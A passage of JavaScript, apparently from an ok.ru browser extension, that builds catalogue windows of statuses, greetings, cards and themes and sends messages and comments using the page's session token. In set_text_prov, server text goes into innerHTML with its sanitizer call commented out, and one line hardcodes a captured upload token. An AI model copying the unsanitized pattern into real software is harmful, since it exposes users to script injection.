		var cat_id=window_block.getAttribute('cat_id');
		var cat_f=window_block.getAttribute('cat_f');
		var page=window_block.getAttribute('page');
		var search=window_block.getAttribute('search');
		var reg_post_type='';
		if (req_post.type!='')
		{
			reg_post_type=req_post.type;
		}
		if (podmod=='smiles')
		{
			visible_div('ok_window');					
			status_add_div('smiles', '', '');			
		}
		else
		{
			visible_diva('ok_window_content_load', 'block', 'this');			
		}				
		visible_diva('ok_cat_user_izbr', 'none', '');
		visible_diva('ok_window_block_cat', 'block', '');			
		sendRequest({action: 'content_load', mod: mod, cat_id: ''+cat_id+'', cat_f: ''+cat_f+'', reg_post: ''+reg_post_type+'', page: ''+page+'', search: ''+search+'', user: user}, function(data) { 						
			visible_diva('ok_window_content_load', 'none', 'this');	
			if (podmod=='')
			{
				doc.getElementById("ok_window_content_page").setAttribute('style','display:block');
				doc.getElementById("ok_window_content_menu").setAttribute('style','display:block');
				doc.getElementById("ok_window_content_hr").setAttribute('style','display:block');	
			}
			
			var window_cat=doc.getElementById("ok_window_cat") || null;
			if (window_cat)
			{			
				if (data.cat)
				{		
					clear_html(window_cat);
					if (mod=='status')
					{
						var ul=create_dom('ul', window_cat, '', {}, '');	
							create_dom('li', ul, '', {"id":"ok_window_add", "class":"ok_button btn_green btn_h2", "style":"margin-bottom:6px;"}, language_text("ok_status_add_menu"));	
						create_dom('div', window_cat, '', {"class":"ok_window_cat_h"}, language_text("ok_izbrm"));								
						var ul=create_dom('ul', window_cat, '', {"id":"ok_ad_cat_us"}, '');	
							add_cat_user(ul, mod);
							var li=create_dom('li',ul, '', {"id":"ok_click_event-01", "class":"ok_window_cat_event", "cat_id":"01"},language_text("ok_status_my"));
								create_dom('b',li, '', {"cat_id":"01", "style":"margin-left:6px;"}, user[0].status);	
						cat_actual(window_cat, data.cat, date);	
						create_dom('div', window_cat, '', {"class":"ok_window_cat_h"}, language_text("ok_status"));
						var ul_cat=create_dom('ul', window_cat, '', {}, '');
							var li0=create_dom('li',ul_cat, '', {"class":"ok_window_cat_event check", "cat_id":"0"}, 'ЛУЧШЕЕ СЕГОДНЯ');					
								create_dom('b',li0, '', {"cat_id":"0", "style":"margin-left:6px;"}, "100");
							var li1=create_dom('li',ul_cat, '', {"class":"ok_window_cat_event", "cat_id":"10000"}, language_text("ok_status_all"));	
								var all_count=create_dom('b',li1, '', {"cat_id":"10000", "style":"margin-left:6px;"}, "");
								var all_count_day=create_dom('span',li1, '', {"cat_id":"10000","class":"ok_window_cat_event_li"}, "");
							cat_all(ul, ul_cat, data.cat, mod, all_count, all_count_day);
					}				
					else if (mod=='pozd')
					{								
						var ul=create_dom('ul', window_cat, '', {}, '');	
							create_dom('li', ul, '', {"id":"ok_window_add", "class":"ok_button btn_green btn_h2", "style":"margin-bottom:6px;"}, language_text("ok_pozd_add_menu"));	
							create_dom('li', ul, '', {"id":"ok_window_pozd_fast", "class":"ok_button btn_green btn_h2", "style":"margin-bottom:6px;"}, language_text("ok_pozd_bistr"));	
							create_dom('li', ul, '', {"id":"ok_window_pozd_smiles", "class":"ok_button btn_green btn_h2", "style":"margin-bottom:6px;"}, language_text("ok_pozd_risunok"));	
						create_dom('div', window_cat, '', {"class":"ok_window_cat_h"}, language_text("ok_izbrm"));								
						var ul=create_dom('ul', window_cat, '', {"id":"ok_ad_cat_us"}, '');	
							add_cat_user(ul, mod);
							var li=create_dom('li',ul, '', {"class":"ok_window_cat_event", "cat_id":"01"}, language_text("ok_pozd_my"));
								create_dom('b',li, '', {"cat_id":"01", "style":"margin-left:6px;"}, user[0].pozd);									
						cat_actual(window_cat, data.cat, date);	
						create_dom('div', window_cat, '', {"class":"ok_window_cat_h"}, language_text("ok_pozd"));
						var ul_cat=create_dom('ul', window_cat, '', {}, '');	
							var li0=create_dom('li',ul_cat, '', {"class":"ok_window_cat_event check", "cat_id":"0"}, 'ЛУЧШЕЕ СЕГОДНЯ');					
								create_dom('b',li0, '', {"cat_id":"0", "style":"margin-left:6px;"}, "100");
							var li1=create_dom('li',ul_cat, '', {"class":"ok_window_cat_event", "cat_id":"10000"}, language_text("ok_pozd_all"));	
								var all_count=create_dom('b',li1, '', {"cat_id":"10000", "style":"margin-left:6px;"}, "");
								var all_count_day=create_dom('span',li1, '', {"cat_id":"10000","class":"ok_window_cat_event_li"}, "");
							cat_all(ul, ul_cat, data.cat, mod, all_count, all_count_day);
					}
					else if (mod=='card')
					{
						var ul=create_dom('ul', window_cat, '', {}, '');	
							//create_dom('li', ul, '', {"id":"ok_window_add", "class":"ok_button btn_green btn_h2", "style":"margin-bottom:6px;"}, language_text("ok_card_add_menu"));	
							create_dom('div', window_cat, '', {"class":"ok_window_cat_h"}, language_text("ok_izbrm"));								
						var ul=create_dom('ul', window_cat, '', {"id":"ok_ad_cat_us"}, '');	
							add_cat_user(ul, mod);
							var li=create_dom('li',ul, '', {"id":"ok_click_event-01", "class":"ok_window_cat_event", "cat_id":"01"}, language_text("ok_card_my"));
								create_dom('b',li, '', {"cat_id":"01", "style":"margin-left:6px;"}, user[0].pozd);									
						cat_actual(window_cat, data.cat, date);	
						create_dom('div', window_cat, '', {"class":"ok_window_cat_h"}, language_text("ok_card"));
						var ul_cat=create_dom('ul', window_cat, '', {}, '');
							var li0=create_dom('li',ul_cat, '', {"class":"ok_window_cat_event check", "cat_id":"0"}, 'ЛУЧШЕЕ СЕГОДНЯ');					
								create_dom('b',li0, '', {"cat_id":"0", "style":"margin-left:6px;"}, "100");
							var li1=create_dom('li',ul_cat, '', {"class":"ok_window_cat_event", "cat_id":"10000"}, language_text("ok_card_all"));	
								var all_count=create_dom('b',li1, '', {"cat_id":"10000", "style":"margin-left:6px;"}, "");
								var all_count_day=create_dom('span',li1, '', {"cat_id":"10000","class":"ok_window_cat_event_li"}, "");
							cat_all(ul, ul_cat, data.cat, mod, all_count, all_count_day);
					}					
					else if (mod=='theme')
					{
						var ul=create_dom('ul', window_cat, '', {}, '');	
							create_dom('li', ul, '', {"id":"ok_window_add", "class":"ok_button btn_green btn_h2", "style":"margin-bottom:6px;"}, language_text("ok_theme_add_menu"));	
						create_dom('div', window_cat, '', {"class":"ok_window_cat_h"}, language_text("ok_izbrm"));								
						var ul=create_dom('ul', window_cat, '', {"id":"ok_ad_cat_us"}, '');
							add_cat_user(ul, mod);
							var li=create_dom('li',ul, '', {"id":"ok_click_event-01", "class":"ok_window_cat_event", "cat_id":"01"}, language_text("ok_theme_my"));
								create_dom('b',li, '', {"cat_id":"01", "style":"margin-left:6px;"}, user[0].theme);									
						cat_actual(window_cat, data.cat, date);	
						create_dom('div', window_cat, '', {"class":"ok_window_cat_h"}, language_text("ok_themes"));
						var ul_cat=create_dom('ul', window_cat, '', {}, '');	
							var li0=create_dom('li',ul_cat, '', {"class":"ok_window_cat_event check", "cat_id":"0"}, 'ЛУЧШЕЕ СЕГОДНЯ');					
								create_dom('b',li0, '', {"cat_id":"0", "style":"margin-left:6px;"}, "100");
							var li1=create_dom('li',ul_cat, '', {"class":"ok_window_cat_event", "cat_id":"10000"}, language_text("ok_theme_all"));	
								var all_count=create_dom('b',li1, '', {"cat_id":"10000", "style":"margin-left:6px;"}, "");
								var all_count_day=create_dom('span',li1, '', {"cat_id":"10000","class":"ok_window_cat_event_li"}, "");
							cat_all(ul, ul_cat, data.cat, mod, all_count, all_count_day);
					}
					else
					{
						var ul_cat=create_dom('ul', window_cat, '', {}, '');							
							cat_all(ul, ul_cat, data.cat, mod,  '', '');						
					}
					if (mod!=previous_mod_r)
					{
						window_cat.scrollTop = 0;
					}					
					window_load_listener(mod);	
				}							
			}				
			if (podmod=='')
			{
				var window_content=doc.getElementById("ok_window_content") || null;
				if (window_content)
				{	
					var ok_window_content_table=doc.getElementById("ok_window_content_table") || null;
					if (ok_window_content_table)
					{							
						ok_window_content_table.parentNode.removeChild(ok_window_content_table);
					}
					var ok_cat_user_izbr=doc.getElementById("ok_cat_user_izbr") || null;
					if (mod=='status')
					{
						if (data.error[0].err)
						{
							content_error(window_content, data.error[0]);	
						}
						else
						{																		
							var table=create_dom('table', window_content, '', {"cellpadding":"0", "cellspacing":"0", "id":"ok_window_content_table", "class":"ok_window_content_table"}, '');	
							for(var s = 0; s < data.status.length; s++) 
							{           	
								var status_value=data.status[s].text.replace(/\x22+/g, '');
								var tr=create_dom('tr', table, '', {}, '');	
									var td=create_dom('td', tr, '', {}, '');
										var div=create_dom('div', td, '', {"class":"ok_copy_block"}, '');
											create_dom('div', div, '', {"class":"ok_copy_shadow"}, '');
											create_dom('div', div, '', {}, data.status[s].text);
									var td4=content_rat(data.status[s].id, data.status[s].rating, data.status[s].load, tr, '', '', '', '190');
										create_dom('button', td4, '', {"class":"ok_button_left btn_green", "mat_id":""+data.status[s].id+"", "value":""+status_value+""}, language_text("ok_ustanov"));								
									if(data.status[s].izbr)	
									{
										create_dom('button', td4, '', {"class":"ok_button_right btn_orange", "mat_id":""+data.status[s].id+""}, "–");	
									}
									else
									{
										create_dom('button', td4, '', {"class":"ok_button_right btn_red", "mat_id":""+data.status[s].id+""}, "+");	
									}
							}		
						}						
						doc.getElementById("ok_window_content_menu_10").setAttribute('style','display:none');							
					}
					else if (mod=='pozd')
					{
						if (data.error[0].err)
						{
							content_error(window_content, data.error[0]);	
						}
						else
						{		
							var table=create_dom('table', window_content, '', {"cellpadding":"0", "cellspacing":"0", "id":"ok_window_content_table", "class":"ok_window_content_table"}, '');	
							for(var s = 0; s < data.pozd.length; s++) 
							{        						
								var tr=create_dom('tr', table, '', {}, '');	
									var td=create_dom('td', tr, '', {"align":"center"}, '');
										var div=create_dom('div', td, '', {"class":"ok_copy_block"}, '');
											create_dom('div', div, '', {"class":"ok_copy_shadow"}, '');
											var text_div=create_dom('div', div, '', {"style":"position:relative"}, '');
												var text_div1=create_dom('div', text_div, '', {"class":"ok_pozd_text", "id":"ok_pozd_text_"+data.pozd[s].id+""}, '');
												set_text_prov(text_div1, data.pozd[s].text);																																	
									var td4=content_rat(data.pozd[s].id, data.pozd[s].rating, data.pozd[s].load, tr, data.pozd[s].author_name, data.pozd[s].uid, data.pozd[s].user_rating, '190');	
										create_dom('button', td4, '', {"class":"ok_button_left btn_green", "mat_id":""+data.pozd[s].id+""}, language_text("ok_otpravit"));															
									if(data.pozd[s].izbr)	
									{
										create_dom('button', td4, '', {"class":"ok_button_right btn_orange", "mat_id":""+data.pozd[s].id+""}, "–");	
									}
									else
									{
										create_dom('button', td4, '', {"class":"ok_button_right btn_red", "mat_id":""+data.pozd[s].id+""}, "+");	
									}	
							}
						}
						doc.getElementById("ok_window_content_menu_10").setAttribute('style','display:inline');
						text_mess=data.text_mess;	
					}
					else if (mod=='card')
					{
						if (data.error[0].err)
						{
							content_error(window_content, data.error[0]);	
						}
						else
						{		
							var table=create_dom('table', window_content, '', {"cellpadding":"0", "cellspacing":"0", "id":"ok_window_content_table", "class":"ok_window_content_table"}, '');	
							for(var s = 0; s < data.pozd.length; s++) 
							{        						
								var tr=create_dom('tr', table, '', {}, '');	
									var td=create_dom('td', tr, '', {"align":"center"}, '');
										var div=create_dom('div', td, '', {"class":"ok_copy_block"}, '');
											create_dom('div', div, '', {"class":"ok_copy_shadow"}, '');
											var text_div=create_dom('div', div, '', {}, '');
												var img=create_dom('img', text_div, '', {"src":""+data.pozd[s].file+"", "class":"ok_card_img", "id":"ok_card_img_"+data.pozd[s].id+""}, '');																										
									var td4=content_rat(data.pozd[s].id, data.pozd[s].rating, data.pozd[s].load, tr, data.pozd[s].author_name, data.pozd[s].uid, data.pozd[s].user_rating, '190');	
										create_dom('button', td4, '', {"class":"ok_button_left btn_green", "mat_id":""+data.pozd[s].id+""}, language_text("ok_otpravit"));															
									if(data.pozd[s].izbr)	
									{
										create_dom('button', td4, '', {"class":"ok_button_right btn_orange", "mat_id":""+data.pozd[s].id+""}, "–");	
									}
									else
									{
										create_dom('button', td4, '', {"class":"ok_button_right btn_red", "mat_id":""+data.pozd[s].id+""}, "+");	
									}	
							}
						}
						doc.getElementById("ok_window_content_menu_10").setAttribute('style','display:none');	
					}
					else if (mod=='theme')
					{
						if (data.error[0].err)
						{
							content_error(window_content, data.error[0]);	
						}
						else
						{
							var table=create_dom('table', window_content, '', {"cellpadding":"0", "cellspacing":"0", "id":"ok_window_content_table", "class":"ok_window_content_table"}, '');	
							for(var s = 0; s < data.theme.length; s++) 
							{      								
								var tr=create_dom('tr', table, '', {}, '');	
									var td=create_dom('td', tr, '', {"style":"min-height:103px;"}, '');
										if(data.theme[s].type=='2')
										{
											create_dom('video', td, '', {"autoplay":"true", "class":"ok_window_img", "tid":""+data.theme[s].id+"", "cat_id": ""+cat_id+"", "cat_f": ""+cat_f+"", "loop":"true", "src":""+data.theme[s].imgurl+""}, '');
										}
										else
										{
											create_dom('img', td, '', {"class":"ok_window_img", "tid":""+data.theme[s].id+"", "cat_id": ""+cat_id+"", "cat_f": ""+cat_f+"", "img_url":""+data.theme[s].imgurl+"", "src":""+data.theme[s].imgurl+"", "align":"left"}, '');
										}										
										var td0=create_dom('td', tr, '', {"style":"width:80%;vertical-align:top;"}, '');		
										create_dom('div', td0, '', {"style":"height:20px;font-weight:bold"}, data.theme[s].title);
										create_dom('div', td0, '', {"style":"height:50px;"}, data.theme[s].description);
									var td4=content_rat(data.theme[s].id, data.theme[s].rating, data.theme[s].load, tr, data.theme[s].author_name, data.theme[s].author_uid, data.theme[s].author_rat, '190');	
										create_dom('button', td4, '', {"class":"ok_button_left btn_green", "mat_id":""+data.theme[s].id+"", "value":""+status_value+""}, language_text("ok_ustanov"));
									if(data.theme[s].izbr)	
									{
										create_dom('button', td4, '', {"class":"ok_button_right btn_orange", "mat_id":""+data.theme[s].id+""}, "–");	
									}
									else
									{
										create_dom('button', td4, '', {"class":"ok_button_right btn_red", "mat_id":""+data.theme[s].id+""}, "+");	
									}								
							}
						}
						doc.getElementById("ok_window_content_menu_10").setAttribute('style','display:none');
					}
					else
					{
						if (data.error[0].err)
						{
							content_error(window_content, data.error[0]);	
						}
						else
						{
							doc.getElementById("ok_window_content_page").setAttribute('style','display:none');
							doc.getElementById("ok_window_content_menu").setAttribute('style','display:none');
							doc.getElementById("ok_window_content_hr").setAttribute('style','display:none');						
							var table=create_dom('table', window_content, '', {"cellpadding":"4", "cellspacing":"4", "id":"ok_window_content_table", "class":"ok_window_content_table"}, '');	
							for(var op = 0; op < data.option.length; op++) 
							{      											
								option[data.option[op].id]=new Array({"id":""+data.option[op].id+"","title":""+data.option[op].title+"","style":""+data.option[op].style+""});
								if (get_option(opt_load, data.option[op].id))
								{
									var tr=create_dom('tr', table, '', {}, '');											
										create_dom('td', tr, '', {"class":"ok_option_save ok_select", "id":"ok_option_"+data.option[op].id+"", "mat_id":""+data.option[op].id+""}, data.option[op].title);		
								}
								else
								{
									var tr=create_dom('tr', table, '', {}, '');	
										create_dom('td', tr, '', {"class":"ok_option_save", "id":"ok_option_"+data.option[op].id+"", "mat_id":""+data.option[op].id+""}, data.option[op].title);		
								}						
							}
						}
						doc.getElementById("ok_window_content_menu_10").setAttribute('style','display:none');							
					}	
				}				
				window_block.setAttribute('load', true);
				previous_mod_r=mod;
				window_content.scrollTop = 0;
				page_navigation(data.page[0].numpages, data.page[0].pagenum);
				if (text!="")
				{
					status_add_div(mod, text, '');
				}				
				
				reload_size(true, false);				
			}
		});											
	}	
}
function get_ajax_error(status, textStatus, responseText)
{
	if (status == 0) {
		return ''+language_text("ok_http_error_0")+'';
	} else if (status == 404) {
		return ''+language_text("ok_http_error_404")+'';
	} else if (status == 500) {
		return ''+language_text("ok_http_error_500")+'';
	} else if (textStatus === 'parsererror') {
		return ''+language_text("ok_http_parseerror")+'';				
	} else if (textStatus === 'timeout') {
		return ''+language_text("ok_http_timeout")+'';
	} else if (textStatus === 'abort') {
		return ''+language_text("ok_http_abort")+'';
	} else {
		return ''+language_text("ok_http_non")+' '+responseText+'';
	}
} 
function option_load()
{
	sendRequest({action: 'load_option', param: 'OkOptionStyle'}, function(res) {
		if (res)
		{
			var ok_style=doc.getElementById("oktools_option_style") || null;
			if (ok_style)
			{							
				ok_style.parentNode.removeChild(ok_style);
			}
			var style = document.createElement('style');	
			style.setAttribute('type', 'text/css');
			style.setAttribute('id', 'oktools_option_style');
			style.appendChild(document.createTextNode(res));
			doc.getElementsByTagName('head')[0].appendChild(style);		
		}
		else
		{
			var ok_style=doc.getElementById("oktools_option_style") || null;
			if (ok_style)
			{							
				ok_style.parentNode.removeChild(ok_style);
			}
		}
	});
	sendRequest({action: 'load_option', param: 'OkOption'}, function(result) {
		if (result) 
		{
			opt_load=result;
		}
	}, true);
}
function get_option(opt, id)
{	
	var result=false;	
	if (opt!="")
	{
		var str = opt.split(',');
		
		for(i=0; i<str.length; i++)
		{			
			var option=str[i].match(/("([\d]+)":"([true|false]+))"/i);
			if (option[2]==id)
			{
				if (option[3]=="true")
				{
					result=true;
				}
			}				
		}
	}
	return result;
}
function set_option(id, res)
{
	var k=1;
	var str="";
	var style="";
	for (var key in option) 
	{
		if (key==id)
		{
			if (k==1)
			{
				str='"'+key+'":"'+res+'"';
			}
			else
			{
				str=str+',"'+key+'":"'+res+'"';
			}
			if (res=="true")
			{
				style=style+' '+option[key][0].style;
			}
		}
		else
		{
			if (get_option(opt_load, key))
			{
				if (k==1)
				{
					str='"'+key+'":"true"';
				}
				else
				{
					str=str+',"'+key+'":"true"';
				}
				style=style+' '+option[key][0].style;
			}
			else
			{
				if (k==1)
				{
					str='"'+key+'":"false"';
				}
				else
				{
					str=str+',"'+key+'":"false"';
				}
			}
		}
		k++;
	}	
	sendRequest({action: 'save_option', param: 'OkOption', text: str}, function() {   }, true);
	sendRequest({action: 'save_option', param: 'OkOptionStyle', text: style}, function() { option_load();  }, true);	
}
function option_save(id)
{	
	var opt_el=doc.getElementById("ok_option_"+id+"") || null;
	if (opt_el)
	{
		if (get_option(opt_load, id))
		{	
			opt_el.classList.remove('ok_select');
			set_option(id, "false");
		}		
		else
		{					
			opt_el.classList.add('ok_select');
			set_option(id, "true");
		}		
	}					
}
function reload_param(ok_window, mod)
{
	if (mod!="")
	{
		var t_mod=ok_window.getAttribute('mod');
		if(t_mod!=mod)
		{
			ok_window.setAttribute('mod',mod);
			ok_window.setAttribute('search','');
			ok_window.setAttribute('page','0');
			ok_window.setAttribute('cat_f','0');
			ok_window.setAttribute('cat_id','0');
			previous_cat_id=0;		
			cat_select="";
			doc.getElementById("ok_window_mod_"+previous_mod).setAttribute('class','ok_button btn_orange btn_h2');
			doc.getElementById("ok_window_mod_"+mod).setAttribute('class','ok_button btn_orange btn_h2_hov');
			previous_mod=mod;
			doc.getElementById("ok_window_content_menu_"+previous_cat_f).setAttribute('class','ok_button btn_orange');
			doc.getElementById("ok_window_content_menu_0").setAttribute('class','ok_button btn_orange btn_hov');
			previous_cat_f=0;		
		}
	}
}
function load_img(uid, img_url, callback)
{
	var uid=uid;
	//console.log('load_img|'+uid+'|'+img_url+'');
	var content_var=get_content_var();
	var action = (uid) ? 'user/allocate?type=J&' : 'attach/allocate?';
	var url="https://ok.ru/web-api/photo/upload/"+action+"count=1&nc="+(new Date()).getTime()+"";
	sendRequest({action: 'load_img', url:url, data:'',img_url:img_url, token:content_var.token, file:false}, function(data) { 
		if ((data.id) && (data.token))
		{
			//console.log('load_img_OK|'+uid+'|'+data.id+'|'+data.token+'');
			var attach = {"uid":""+uid+"", "attach":"{'type':'PHOTOUPLOADED','id':'"+data.id+"','token':'"+data.token+"'}"};
			callback(attach);			
		}
		else		
		{
			callback(false);
		}
	});
		
}
function uuids()
{
	var guid = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
		var r = Math.random()*16|0, v = c == 'x' ? r : (r&0x3|0x8);
		return v.toString(16);
	});
	return guid.toUpperCase();
}
function send_message(type, action, data, uid, mess, attach, callback)
{
	var message=encodeURIComponent(mess);	
	var id=new Date().getTime();	
	var uuid=uuids();
	var content_var=get_content_var();
	//console.log('REQ_POST.TYPE|'+type+'|'+action+'|'+data+'|'+uid+'||'+content_var.token);
	if (type=='message')
	{
		var answer_data="";
		var send_data="";
		var answer = doc.querySelector('.msg.js-msg.__sticker-re.__active');
		if (answer)
		{
			if (answer.hasAttribute('id'))
			{
				var answer_id=answer.getAttribute('id');
				answer_data="&st.msgMarker="+answer_id+"";
			}
		}
		if (attach!='')
		{
			var attach_encod = encodeURIComponent("["+attach+"]");
			var send_data="st.txt="+message+"&st.uuid="+uuid+"&st.attach="+attach_encod+"&gwt.requested="+content_var.gwtHash+""+answer_data+"";
		}
		else
		{
			var send_data="st.txt="+message+"&st.uuid="+uuid+"&gwt.requested="+content_var.gwtHash+""+answer_data+"";
		}
		if (action.search(/cmd=MessagesController/gi)!=-1)
		{		
			action="https://ok.ru"+action;
			if (typeof uid === 'object')
			{
				//console.log('MessagesController|UID LIST');
				if(uid.length>0)
				{			
					for (var i=0;i<uid.length;i++)
					{				
						send_message_('message', uid[i], "https://ok.ru/dk?cmd=MessagesController&st.convId=PRIVATE_"+uid[i]+"&st.cmd=userMain", send_data, content_var.token, function(result){callback(result);});				
					}
				}
			}
			else if (typeof uid === 'string')
			{
				send_message_('message', uid, action, send_data, content_var.token, function(result){callback(result);});				
			}
		}
		else if (action.search(/cmd=CommentBlock/gi)!=-1)
		{					
			//console.log('CommentBlock|'+action+'|'+uid);
			if (action.search(/dtype=([a-z_]+)/i)!=-1)
			{
				var saId=0;
				var did=0;
				var fid=0;
				var dtype="";
				var search_saId=action.match(/saId=([\d]+)/i);
				if (search_saId && search_saId.length > 1)
				{							
					saId=search_saId[1];	
				}
				var search_did=action.match(/did=([\d]+)/i);
				if (search_did && search_did.length > 1)
				{							
					did=search_did[1];	
				}
				var search_fid=action.match(/friendId=([\d]+)/i);
				if (search_fid && search_fid.length > 1)
				{							
					fid=search_fid[1];	
				}
				var search_dtype=action.match(/dtype=([a-z_]+)/i);
				if (search_dtype && search_dtype.length > 1)
				{							
					dtype=search_dtype[1];	
				}
				var data='st.dOFC=off&st.dM=&st.dRT=off&st.attached=%5B%7B%22type%22%3A%22PHOTOUPLOADED%22%2C%22id%22%3A852319764630%2C%22token%22%3A%22tbYsmyXMHs07cC0bwmQd%2BfdMbFWi6ASeetydQriCwheXX3%2B3DsAfXocaANfrTbVxFuKdh66ghxUpJpWh%2BJ4R0iyQ74jyuQqaYrjNuMozYLAhSPWe9mhwXMGmwUiJhvbi%22%7D%5D&st.tlb.act=actSC&st.cntId=cf403069251759&st.refId=sendComment-403069251759&gwt.requested=2cb765ca';
				var data = 'tlb.act=actSC&did='+did+'&dtype='+dtype+'&dOI='+saId+'&dDAP=off&dLLC=off&refId=sendComment-'+new Date().getTime()+'';
				//console.log(data);
				send_mess_dialog(data, message, attach, content_var, function(result){callback(result);});	
			}
		}
		else
		{
			var action="https://ok.ru/dk?cmd=MessagesController&st.convId=PRIVATE_"+uid+"&st.cmd=userMain&st.openPanel=messages";
			send_message_('message', uid, action, send_data, content_var.token, function(result){callback(result);});	
		}
	}
	if (type=='dialog')
	{
		send_mess_dialog(data, message, attach, content_var, function(result){callback(result);});				
	}
	
}
function send_mess_dialog(data, message, attach, content_var, callback)
{
	//console.log('SEND MESS DIALOG');
	var answer_str="";
	var answer=doc.querySelector('.disc_add_comment_noreplay');
	if (answer)
	{
		if (answer.hasAttribute('data-query'))
		{
			var answer_data=answer.getAttribute('data-query');
			var answ=JSON.parse(answer_data);
			answer_str="&dRTOC=off&dRT=on&dCI="+answ.convId+"&dMI="+answ.msgIdx+"&dCT="+answ.cmntTime+"";
			clear_html(answer.parentNode);
		}	
	}
	var comm_group="";
	var group=doc.querySelector('#officialComment:checked');
	if (group)
	{
		comm_group="&dOFC=on";
	}
	else
	{
		comm_group="&dOFC=off";
	}
	if (data=="")
	{	
		data=dialog_data(false);
	}
	if (attach!='')
	{
		var attach = encodeURIComponent("["+attach+"]");
		message="";
	}
	content_var.state=content_var.state.replace(/&amp;/gi,"&");
	var send_data=""+data+""+comm_group+"&st.attached="+attach+"&dM="+message+""+answer_str+"";
	var action="https://ok.ru/dk?cmd=ToolbarDiscussions&gwt.requested="+content_var.gwtHash+""+(content_var.state?"&"+content_var.state:"");//&st.cmd=userMain
	send_message_('dialog', '', action, send_data, content_var.token, function(result){callback(result);});			
}
function send_message_(type, uid, url, data, token, callback)
{
	sendRequest({action: 'ajaxPost', uid:uid, url:url, data:data, token:token}, function(data) {			
		//console.log(data);
		if (data.result)
		{
			console.log('Сообщение отправлено');
			callback(true);
		}
		else
		{
			console.log('Сообщение не отправлено. Ошибка: '+data.error);
			alert('Сообщение не отправлено. Ошибка: '+data.error+'');
			callback(false);
		}
	});	
}
safeResponse = function(){

    var validAttrs = [ "class", "id", "href", "style" ];
    
    this.__removeInvalidAttributes = function(target) {
        var attrs = target.attributes, currentAttr;

        for (var i = attrs.length - 1; i >= 0; i--) {
            currentAttr = attrs[i].name;

            if (attrs[i].specified && validAttrs.indexOf(currentAttr) === -1) {
                target.removeAttribute(currentAttr);
            }

            if (
                currentAttr === "href" &&
                /^(#|javascript[:])/gi.test(target.getAttribute("href"))
            ) {
                target.parentNode.removeChild(target);
            }
        }
    }
    
    this.__cleanDomString = function(data) {
        var parser = new DOMParser;
        var tmpDom = parser.parseFromString(data, "text/html").body;

        var list, current, currentHref;

        list = tmpDom.querySelectorAll("script,img");

        for (var i = list.length - 1; i >= 0; i--) {
            current = list[i];
            current.parentNode.removeChild(current);
        }

        list = tmpDom.getElementsByTagName("*");

        for (i = list.length - 1; i >= 0; i--) {
            parent.__removeInvalidAttributes(list[i]);
        }

        return tmpDom.innerHTML;
    }
    
    return{
        cleanDomString: function(html){
            return parent.__cleanDomString(html)
        }
    }
}();
function set_text_prov(el, text)
{
	el.innerHTML=text;
	//el.innerHTML=safeResponse.cleanDomString(text);
	
		
}
function request_get_friends(page, mess_type, mat_id, mess_data)
{
	var mess_type=mess_type;
	var mess_data=mess_data;
	var uuid=uuids();
	var content_var=get_content_var();
	if (page==1)
	{
		var send_data="";
	}
	else
	{
		var send_data="fetch=true&st.layer.page="+page+"&st.loaderid=SelectFriendToGiftBlockLoader";
	}
	var url="https://ok.ru/dk?cmd=FriendsContentContainerBlock&st.layer.cmd=PopLayerSendPresentSelectFriendComposite&st._aid=SelectFriend_searchFriend&gwt.requested="+content_var.gwtHash+"";
	sendRequest({action: 'ajaxPost', uid:'0', url:url, data:send_data, token:content_var.token}, function(data) {	
		var popLayer=doc.getElementById("hook_Block_PopLayer") || null;
		if(popLayer)
		{
			var hook_sel=doc.getElementById("hook_Loader_SelectFriendToGiftBlockLoader") || null;
			if(!hook_sel)
			{
				popLayer.setAttribute('style','display:block;');
				var modal=create_dom('div', popLayer, '', {"id":"hook_Modal_popLayerModal","data-layerkey":"SendPresentSelectFriend", "class":"modal-new __size-user_select js-surprise __with-header __docked js-viewport-container"}, '');
					var modal_new=create_dom('style', modal, '', {"class":"modal-new_hld"}, '');						
					var styleel=create_dom('style', modal, '', {"type":"text/css","media":"screen"}, '');	
						styleel.appendChild(document.createTextNode('.ugrid_i {position:relative} .selectable-card.__check .selectable-card_ic{background-position:0 -144px}'));	
					var modal_new=create_dom('div', modal, '', {"class":"modal-new_hld"}, '');						
						var modal_new_cent=create_dom('div', modal_new, '', {"class":"modal-new_center"}, '');
							var modal_new_cnt=create_dom('div', modal_new_cent, '', {"class":"modal-new_cnt"}, '');
								create_dom('div', modal_new_cnt, '', {"style":"font-size:19px;text-align:center;margin-bottom:5px;"}, 'Выберите одного или нескольких друзей и нажмите "ОТПРАВИТЬ"');
								
								var hook_block=create_dom('div', modal_new_cnt, '', {"id":"hook_Block_FriendsContentContainerBlock", "class":"hookBlock"}, '');
								hook_block.innerHTML=data;
								
							var load_control=create_dom('div', modal_new_cnt, '', {"class":"loader-controls loader-controls-bottom"}, '');
								var a=create_dom('a', load_control, '', {"data-page":"2", "id":"get_friends_list_a", "class":"js-show-more link-show-more link-show-more__photo", "href":"#"}, 'Показать ещё');
								a.addEventListener('click', function(e) {												
									var page=this.getAttribute('data-page');
									if (page!=0)
									{
										request_get_friends(page, '', '');
										page++;
										this.setAttribute('data-page',page);
									}
								}); 		
						var modal_new_close=create_dom('div', modal_new, '', {"class":"modal-new_close"}, '');
							var close=create_dom('a', modal_new_close, '', {"class":"ic modal-new_close_ico", "href":"#"}, '');
							close.addEventListener('click', function(e) {								
								clear_html(popLayer);
							}); 
						var sp_hld=create_dom('div', hook_block, '', {"class":"sticky-plank_hld"}, '');
							var sp_modal=create_dom('div', sp_hld, '', {"class":"sticky-plank modal-new_sticky scroll-right-indent h-mod __on"}, '');
								var sp_cnt=create_dom('div', sp_modal, '', {"class":"sticky-plank_cnt"}, '');
									var mod_new=create_dom('div', sp_cnt, '', {"class":"modal-new_actions __center"}, '');
										var mod_cnt=create_dom('div', mod_new, '', {"class":"modal-new_cnt"}, '');
										var butt=create_dom('div', mod_cnt, '', {"class":"ok_button_gift_send"}, 'Оправить выбранным пользователям');
										butt.addEventListener('click', function(e) {
											var butt=this;
											this.textContent="Отправляю сообщения. Ждите...";
											var select_friend=[];														
											var hook_bl=doc.getElementById("hook_Block_FriendsContentContainerBlock") || null;
											if(hook_bl)
											{													
												var friend_check = hook_bl.querySelectorAll('li.ugrid_i[select]');
												if (friend_check.length>0)
												{
													for(var f = 0; f <friend_check.length; f++) 
													{
														if (friend_check[f].hasAttribute('uid'))
														{
															var uid=friend_check[f].getAttribute('uid');
															select_friend.push(uid);																		
														}
													}													
													if (mess_type=="message")
													{							
														if(select_friend.length>0)
														{			
															var send_count=0;
															var err_count=0;
															var count=select_friend.length;
															for (var i=0;i<select_friend.length;i++)
															{				
